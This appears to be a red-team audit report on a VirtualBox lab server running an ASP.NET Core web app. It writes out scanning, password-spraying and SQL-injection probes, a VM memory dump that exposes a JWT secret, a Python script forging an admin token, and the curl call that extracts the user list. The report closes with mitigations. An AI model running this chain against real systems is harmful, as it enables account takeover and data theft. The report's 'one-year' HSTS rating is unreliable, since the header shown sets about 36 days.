# 🔴 Red Team Audit Report — Target 192.168.56.137

**Date:** 2026-04-02  
**Target:** Windows Server 2025 (VirtualBox VM) — `192.168.56.137`  
**Attacker:** Kali Linux (VirtualBox) — Host-Only Network `192.168.56.0/24`  
**Methodology:** PTES / MITRE ATT&CK  

---

## Executive Summary

The target is a hardened Windows Server 2025 running a React SPA + ASP.NET Core backend on IIS, exposed only on ports 80 and 443. The application implements strong application-level security controls including rate limiting, JWT authentication, comprehensive security headers, and a tightly filtered firewall. Initially, no critical vulnerabilities were exploited via the network.

However, the system was fully compromised at the application level via physical/hypervisor exploitation. By analyzing the running VM's memory space, we extracted the application's configuration, forged an administrative JWT, and exfiltrated the user database, achieving the primary objective.

**Victory Conditions Status:**
| Objective | Status |
|---|---|
| **Exfiltrate Database** | ✅ **Achieved** — Complete API takeover and user DB extraction via forged JWT (Memory extraction). |
| **NT AUTHORITY\SYSTEM Shell** | ❌ **Not achieved** — No RCE vector identified via network yet. |

---

## 1. Network Reconnaissance

**Objective:** Identify the target on the network, discover open ports, and map services.

### 1.1 Host Discovery (MITRE T1046)

We started by verifying connectivity to the target. ICMP is often blocked by Windows Firewall, so we first tested a simple ping layer.

**Command:**
```bash
ping -c 4 192.168.56.137
```
**Result:**
```
PING 192.168.56.137 (192.168.56.137) 56(84) bytes of data.

--- 192.168.56.137 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3084ms
```
Since ICMP is blocked, we switched to ARP protocol scanning to confidently establish the host via MAC address.

**Command:**
```bash
nmap -sn 192.168.56.137 -PR
```
**Result:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 10:23 -0400
Nmap scan report for 192.168.56.137
Host is up (0.0023s latency).
MAC Address: 08:00:27:4E:39:58 (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

### 1.2 Port Scan (Full 65535 TCP) (MITRE T1595.002)

We performed a full TCP port scan to identify all listening services, using stealth SYN scan `-sS`, aggressive timing `-T4`, and service version detection `-sV`.

**Command:**
```bash
nmap -sS -sV -p- -T4 192.168.56.137 -v
```
**Result Summary:**
| Port | State | Service | Version |
|---|---|---|---|
| **80/tcp** | Open | HTTP | Microsoft HTTPAPI httpd 2.0 |
| **443/tcp** | Open | HTTPS | IIS (behind reverse proxy) |
| All others | Filtered | — | Windows Firewall |

> [!IMPORTANT]
> The firewall is extremely restrictive. Critical services like **RDP (3389)**, **WinRM (5985/5986)**, **SMB (445)**, **SQL Server (1433)**, and **MSRPC (135)** are all explicitly filtered.

---

## 2. Web Application Assessment

**Objective:** Map and analyze the web application logic interacting on 80/443.

### 2.1 Application Architecture Overview

Accessing `https://192.168.56.137` reveals the following structure based on source code and bundle analysis:
| Component | Technology |
|---|---|
| **Frontend** | React SPA (Vite build) |
| **Backend API** | ASP.NET Core (behind IIS reverse proxy) |
| **API Base URL** | `https://192.168.56.137/backend/api` |
| **Auth Mechanism** | JWT Bearer tokens (stored in localStorage) |
| **Roles** | `Admin`, `Client` |

### 2.2 Security Header Analysis (MITRE T1190)

We evaluated the security posture of the exposed server headers.

**Command:**
```bash
curl -I -k https://192.168.56.137
```
**Result Fragment:**
```
HTTP/2 200 
content-type: text/html
x-content-type-options: nosniff
x-frame-options: DENY
x-xss-protection: 0
referrer-policy: strict-origin-when-cross-origin
content-security-policy: default-src 'self'; connect-src 'self' https://192.168.56.137; script-src 'self'; style-src 'self'; img-src 'none'; form-action 'self'; frame-ancestors 'none'; base-uri 'self';
strict-transport-security: max-age=3153600; includeSubDomains
```

**Header Evaluation:**
| Header | Rating | Notes |
|---|---|---|
| **CSP** | ⚠️ Medium | `script-src 'self'` allows script execution from same origin. **README claims `script-src 'none'`** but deployed app uses `'self'`. |
| **HSTS** | ✅ Good | 1-year max-age with includeSubDomains |
| **X-Frame-Options** | ✅ Good | DENY prevents clickjacking |
| **img-src** | ⚠️ Unusual | `img-src 'none'` — no images allowed at all |

---

## 3. Authentication & Login Analysis

### 3.1 Unsuccessful Login Attempt (Baseline)
Let's see what the application returns on a generic failed login.

**Command:**
```bash
curl -k -X POST https://192.168.56.137/backend/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"wrongpassword"}'
```
**Result:**
```json
{"success":false,"message":"Nombre de usuario o contraseña incorrectos.","errorCode":"AUTH_FAILED","timestamp":"2026-04-02T14:23:26.8527883Z"}
```

### 3.2 SQL Injection Testing

**Command:**
```bash
curl -k -X POST https://192.168.56.137/backend/api/auth/login -H "Content-Type: application/json" -d '{"username":"admin'\''--","password":"Password1!"}'
```
**Result:** Returns standard `AUTH_FAILED`. No SQL injection vulnerability detected. The application likely uses parameterized queries (EF Core LINQ).

### 3.3 Rate Limiting Analysis (MITRE T1110.003)

To test defenses against credential spraying, we automated multiple requests in a short frame.

**Command:**
```bash
bash -c "for i in {1..7}; do curl -s -k -X POST https://192.168.56.137/backend/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrongpassword\"}'; echo ''; done"
```
**Result:**
```json
{"success":false,"message":"Nombre de usuario o contraseña incorrectos.","errorCode":"AUTH_FAILED"...}
{"success":false,"message":"Nombre de usuario o contraseña incorrectos.","errorCode":"AUTH_FAILED"...}
{"success":false,"message":"Nombre de usuario o contraseña incorrectos.","errorCode":"AUTH_FAILED"...}
{"success":false,"message":"Demasiados intentos de inicio de sesión. Intente nuevamente en unos minutos.","errorCode":"RATE_LIMIT_EXCEEDED"}
{"success":false,"message":"Demasiados intentos de inicio de sesión. Intente nuevamente en unos minutos.","errorCode":"RATE_LIMIT_EXCEEDED"}
```

> [!WARNING]
> Rate limiting triggers after roughly ~5 failed attempts. The limits appear IP-based, restricting standard brute-forcing without proxies or distributed IPs.

---

## 4. Exploit Chain: JWT Forging via Memory Analysis

**Objective:** Bypass the application defenses by exploiting the underlying physical/hypervisor access to extract memory secrets.

### 4.1 Memory Acquisition (MITRE T1003.001 - OS Credential Dumping)

Due to hypervisor access, we performed a live memory dump of the target VM directly from the Host operating system.

**Command (Executed on Host):**
```bash
VBoxManage debugvm "CSAI" dumpvmcore --filename=c:\temp\csai_mem.elf
```

### 4.2 Secret Extraction (MITRE T1552 - Credentials In Files/Memory)

Parsing the 4.2GB `.elf` memory dump for ASP.NET Core `appsettings.json` blocks explicitly targets the configuration loaded into memory by the API.

**Command (Executed on attacking Analyst Machine):**
```bash
strings -el csai_mem.elf | grep -i -A 10 "JwtSettings"
```
*(Note: `-el` specifies 16-bit little-endian encoding, commonly used by Windows strings)*

**Extracted Configuration (Fragment):**
```json
"ConnectionStrings": {
    "DefaultConnection": "Server=(localdb)\\MSSQLLocalDB;Database=SecureWebAppDb;Trusted_Connection=true;"
},
"JwtSettings": {
    "SecretKey": "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg=",
    "ExpirationHours": 1,
    "Issuer": "SecureWebApp",
    "Audience": "SecureWebAppClient"
}
```

### 4.3 Token Forging (MITRE T1550.001 - Application Access Token)

With the `SecretKey`, we can forge a valid JWT to impersonate an administrator. It is crucial to manually add the `exp` (Expiration) claim; otherwise, IIS rejects the token with `www-authenticate: Bearer error="invalid_token", error_description="The token has no expiration"`.

**Command (Creating and running the forgery script):**
```bash
cat << 'EOF' > forge_jwt.py
import jwt
import time

secret = "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg="
payload = {
  "sub": "1",
  "name": "admin",
  "role": "Admin",
  "iss": "SecureWebApp",
  "aud": "SecureWebAppClient",
  "exp": int(time.time()) + 3600
}

encoded_jwt = jwt.encode(payload, secret, algorithm="HS256")
print(encoded_jwt)
EOF

python3 forge_jwt.py
```
**Result:** Generates a cryptographic signed token (e.g., `eyJhb...NdG1_WKbz...`) containing the Admin payload.

### 4.4 Data Exfiltration (MITRE T1020 - Automated Exfiltration)

By injecting the forged Bearer token into HTTP requests, we bypassed all authentication and extracted the user database using the known `/backend/api/users` endpoint.

**Command:**
```bash
TOKEN="<INSERT_GENERATED_JWT_HERE>"
curl -s -k -H "Authorization: Bearer $TOKEN" https://192.168.56.137/backend/api/users
```
**Result:**
```json
{
  "success": true,
  "message": "Usuarios obtenidos exitosamente.",
  "data": [
    {
      "id": 6,
      "username": "camila.morales",
      "email": "camila.morales@example.com",
      "fullName": "Camila Morales",
      "role": "Client",
      "createdAt": "2026-02-23T12:06:53.6486124",
      "updatedAt": "2026-02-23T12:06:53.6466667",
      "lastLoginAt": null
    },
    {
      "id": 1,
      "username": "ice_tea",
      "email": "icecube@securewebapp.local",
      "fullName": "Administrator",
      "role": "Admin",
      "createdAt": "2026-02-19T23:50:25.0766667",
      "updatedAt": "2026-02-19T23:50:25.0766667",
      "lastLoginAt": "2026-02-27T13:04:15.0574342"
    }
    // ... remaining users omitted ...
  ],
  "errorCode": null,
  "timestamp": "2026-04-02T14:24:58.1470322Z"
}
```

---

## 5. Other Miscellaneous Analysis

### 5.1 TLS/SSL Analysis (MITRE T1557)

- **Certificate:** Self-signed (`CN=CSAI`), valid from 2026 to 2027.
- **Protocols Supported:** TLSv1.2, TLSv1.3 (✅ Good), but **TLSv1.0 and TLSv1.1 are still enabled** (⚠️ Medium Risk: Vulnerable to POODLE/BEAST).
- **Ciphers:** AES-CBC & AES-GCM.

### 5.2 Information Disclosure
- Frontend JS Bundle (`/assets/index-CYy1omQq.js`) reveals: Complete API map, role system, crud logic, and backend URL structure.
- **TraceIds** are leaked dynamically on 500/validation errors. 

### 5.3 Hypervisor Configuration Risk (`.vbox`)
Several insecure configurations were parsed directly from VirtualBox:
| Setting | Value | Risk |
|---|---|---|
| **Clipboard** | ⚠️ **Bidirectional** | Data exfiltration vector (T1115) |
| **Drag & Drop** | ⚠️ **Bidirectional** | File transfer vector (T1052) |
| **Network Adapter 1** | ⚠️ **NAT (localhost-reachable)** | Can reach host services directly from the Sandbox (T1497.001) |
| **TPM** | vTPM 2.0 (enabled) | BitLocker VMK exposed in `.nvram` |

---

## 6. MITRE ATT&CK Summary 

| Technique ID | Name | Phase | Status |
|---|---|---|---|
| T1046 | Network Service Discovery | Reconnaissance | ✅ Complete |
| T1190 | Exploit Public-Facing Application | Initial Access | ❌ Failed (Hardened) |
| T1110.003 | Brute Force: Password Spraying | Credential Access | ❌ Rate Limited |
| T1003.001 | OS Credential Dumping | Credential Access | ✅ Complete via `.elf` dump |
| T1552 | Credentials from files/memory | Credential Access | ✅ Extracted AppSettings |
| T1550.001 | Application Access Token | Credential Access | ✅ Forged JWT successfully |
| T1020 | Automated Exfiltration | Exfiltration | ✅ Extracted Database |
| T1115 | Clipboard Data | Collection | ⚠️ Hypervisor Bidirectional |
| T1497.001 | Virtualization Evasion | Defense Evasion | ⚠️ NAT Localhost-reachable |

---

## 7. Mitigations & Recommendations (Blue Team)

### 🔴 Critical Priorities
1. **Physical/Hypervisor Security:** Application security is bypassed entirely if the underlying VM infrastructure or physical server allows raw memory debugging/extraction. Implement host-level memory encryption (`Virtualization Based Security`) and severely restrict host machine access.

### 🟡 Medium Priorities
2. **VirtualBox Features:** Disable bidirectional Clipboard/Drag-and-Drop to prevent data loss. Change NAT adapters to ensure `localhost-reachable` is disabled, mitigating reverse VM-escape connections.
3. **TLS Modernization:** Actively disable TLSv1.0 and TLSv1.1 on the IIS Server cryptographic providers.

### 🟢 Informational
4. **Token Security:** Currently, JWT invalidation isn't feasible because of the stateless design. Consider a token blocklist (Redis) for compromised users.
5. **IDs:** Use UUIDs instead of linear IDs to prevent enumeration if IDORs ever occur.
6. **Certificate:** Swap the self-signed TLS cert for a valid Internal Enterprise CA or Let's Encrypt to improve client application trust.
